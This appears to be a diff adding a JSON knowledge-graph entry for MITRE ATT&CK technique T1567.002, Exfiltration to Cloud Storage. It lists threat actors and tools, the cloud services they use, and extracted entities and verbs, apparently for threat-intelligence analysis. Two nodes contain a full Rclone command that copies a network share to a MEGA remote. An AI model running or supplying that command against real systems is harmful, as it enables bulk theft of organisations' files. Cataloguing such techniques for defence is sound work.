@@ -1,0 +1,325 @@
+{
+    "id": "T1567.002",
+    "tech_id": "T1567.002",
+    "tech_name": "Exfiltration to Cloud Storage",
+    "best_phrases": [],
+    "tactics": [
+        "TA0010"
+    ],
+    "features": [
+        "DATA",
+        "COMPONENT",
+        "FUNCTION",
+        "NETWORK",
+        "DIRECTORY",
+        "USER"
+    ],
+    "locations": [
+        "Linux",
+        "macOS",
+        "Windows"
+    ],
+    "procedures": [
+        "relationship--035e7890-593f-4f70-898a-93f3302f8fac",
+        "relationship--03aece39-d7a2-47a4-be1a-b1d6f1d72654",
+        "relationship--1ae24ad1-8730-4a38-8d68-dd57b335b9b4",
+        "relationship--1bcc7bc4-29ab-4e27-8b9e-e7c51343148e",
+        "relationship--1cfb7192-6136-4946-8ee1-498f59125b9b",
+        "relationship--1e2baacb-9033-49a9-890a-f48c87ab1531",
+        "relationship--21511746-7782-42f2-ba77-b189777ef66c",
+        "relationship--21ef7a27-1019-4ced-8a09-63351bbbc150",
+        "relationship--2fcc26f7-9da6-4155-af96-b826e2dfe085",
+        "relationship--3077e0e6-4540-4f0d-a2ec-c4db78a35a0e",
+        "relationship--3b9f9fae-f68a-419b-9551-5485f8851500",
+        "relationship--3d4490e3-d3fe-4c2e-8c41-69ebbf8d060e",
+        "relationship--43300665-e487-470f-a3ec-2aaeb76b2a5f",
+        "relationship--6193189a-f24c-4680-9a20-d191f42b9c97",
+        "relationship--6e137013-3837-4b56-8424-4ea6d87044b5",
+        "relationship--743f2f00-57d0-4df8-94db-b044e2551890",
+        "relationship--7dda2468-0344-48c5-8843-6655084d8159",
+        "relationship--80efda4a-36a7-4b59-9f70-72f4952e2140",
+        "relationship--98ec1cf2-91ed-4a5f-b653-1d60259d0b46",
+        "relationship--a44ba3c3-406a-49cf-9d7b-9ee7f09f9ae4",
+        "relationship--a9fedca4-fd68-4e3f-a564-cb9c168a8e4e",
+        "relationship--b38a0fe4-6482-4c13-9def-5c8a82f31226",
+        "relationship--b8458076-fd1f-48e1-a637-57690c4fe59d",
+        "relationship--d17fcc24-a9ae-4841-b35b-f694b3991fba",
+        "relationship--d7d9a45b-0f61-43a0-93fd-7924c9307f72",
+        "relationship--f1c96864-f698-44a7-924e-98203b97c8db",
+        "relationship--f770ba6c-df62-4bd4-ab29-34a954c4f6ac"
+    ],
+    "graph_nodes": [
+        {
+            "count": 26,
+            "id": 0,
+            "texts": [
+                "Leviathan",
+                "LuminousMoth",
+                "RainyDay",
+                "CreepyDrive",
+                "HEXANE",
+                "HAMMERTOSS",
+                "actors",
+                "Kimsuky",
+                "ZIRCONIUM",
+                "Crutch",
+                "Threat Group-3390",
+                "Confucius",
+                "POLONIUM",
+                "threat actors",
+                "Clambling",
+                "Octopus",
+                "HAFNIUM",
+                "Wizard Spider",
+                "Turla",
+                "Earth Lusca",
+                "BoxCaon",
+                "Lazarus Group",
+                "Chimera",
+                "ROKRAT",
+                "BoomBox",
+                "FIN7"
+            ],
+            "label": "ACTOR"
+        },
+        {
+            "count": 9,
+            "id": 1,
+            "texts": [
+                "uploader",
+                "LUNCHMONEY",
+                "Rclone",
+                "file exfiltration tool",
+                "Rclone command rclone.exe copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M",
+                "Empire",
+                "megacmd tool",
+                "capability",
+                "open-source command-line dbxcli"
+            ],
+            "label": "FUNCTION"
+        },
+        {
+            "count": 32,
+            "id": 2,
+            "texts": [
+                "files",
+                "data",
+                "data",
+                "files",
+                "data",
+                "accounts",
+                "stolen files",
+                "data",
+                "Blogspot accounts",
+                "stolen data",
+                "victim data",
+                "cloud storage service accounts",
+                "stolen data",
+                "POLONIUM-owned OneDrive and Dropbox accounts",
+                "files",
+                "sensitive data",
+                "Rclone command rclone.exe copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M",
+                "files",
+                "data",
+                "stolen victim data",
+                "stolen USB files",
+                "stolen files",
+                "stolen files",
+                "contents",
+                "results",
+                "custom build",
+                "stolen data",
+                "stolen data",
+                "OneDrive accounts",
+                "data",
+                "data",
+                "stolen data"
+            ],
+            "label": "DATA"
+        },
+        {
+            "count": 26,
+            "id": 3,
+            "texts": [
+                "Dropbox",
+                "Google Drive",
+                "Google Drive",
+                "cloud storage services",
+                "Dropbox",
+                "MEGA",
+                "Amazon S3",
+                "Dropbox",
+                "cloud services",
+                "OneDrive",
+                "Dropbox",
+                "machine",
+                "Dropbox",
+                "file sharing sites",
+                "MEGA",
+                "OneDrive",
+                "4shared",
+                "cloud drive",
+                "Dropbox",
+                "MEGA",
+                "system",
+                "Dropbox drive",
+                "Dropbox",
+                "cloud storage services",
+                "PCloud",
+                "Dropbox"
+            ],
+            "label": "COMPONENT"
+        },
+        {
+            "count": 2,
+            "id": 4,
+            "texts": [
+                "that",
+                "cloud storage providers"
+            ],
+            "label": "OTHER"
+        },
+        {
+            "count": 6,
+            "id": 5,
+            "texts": [
+                "MEGA cloud storage site",
+                "file sharing sites",
+                "MEGA",
+                "WebDAV",
+                "victim network",
+                "MEGA file sharing site"
+            ],
+            "label": "NETWORK"
+        },
+        {
+            "count": 1,
+            "id": 6,
+            "texts": [
+                "victim"
+            ],
+            "label": "USER"
+        },
+        {
+            "count": 2,
+            "id": 7,
+            "texts": [
+                "folders",
+                "dedicated per-victim folders"
+            ],
+            "label": "DIRECTORY"
+        }
+    ],
+    "graph_edges": [
+        {
+            "id": "0_1",
+            "source": 0,
+            "dest": 1,
+            "count": 5
+        },
+        {
+            "id": "1_2",
+            "source": 1,
+            "dest": 2,
+            "count": 4
+        },
+        {
+            "id": "2_3",
+            "source": 2,
+            "dest": 3,
+            "count": 15
+        },
+        {
+            "id": "4_3",
+            "source": 4,
+            "dest": 3,
+            "count": 1
+        },
+        {
+            "id": "0_2",
+            "source": 0,
+            "dest": 2,
+            "count": 26
+        },
+        {
+            "id": "0_3",
+            "source": 0,
+            "dest": 3,
+            "count": 7
+        },
+        {
+            "id": "1_3",
+            "source": 1,
+            "dest": 3,
+            "count": 2
+        },
+        {
+            "id": "0_5",
+            "source": 0,
+            "dest": 5,
+            "count": 4
+        },
+        {
+            "id": "2_5",
+            "source": 2,
+            "dest": 5,
+            "count": 4
+        },
+        {
+            "id": "3_6",
+            "source": 3,
+            "dest": 6,
+            "count": 1
+        },
+        {
+            "id": "0_4",
+            "source": 0,
+            "dest": 4,
+            "count": 1
+        },
+        {
+            "id": "2_4",
+            "source": 2,
+            "dest": 4,
+            "count": 1
+        },
+        {
+            "id": "2_7",
+            "source": 2,
+            "dest": 7,
+            "count": 2
+        },
+        {
+            "id": "2_1",
+            "source": 2,
+            "dest": 1,
+            "count": 1
+        },
+        {
+            "id": "0_7",
+            "source": 0,
+            "dest": 7,
+            "count": 1
+        },
+        {
+            "id": "7_3",
+            "source": 7,
+            "dest": 3,
+            "count": 1
+        }
+    ],
+    "verbs": {
+        "use": 8,
+        "exfiltrate": 15,
+        "to": 36,
+        "upload": 6,
+        "create": 1,
+        "send": 2,
+        "from": 3,
+        "of": 3,
+        "have": 1,
+        "download": 1,
+        "on": 1,
+        "in": 1
+    }
+}
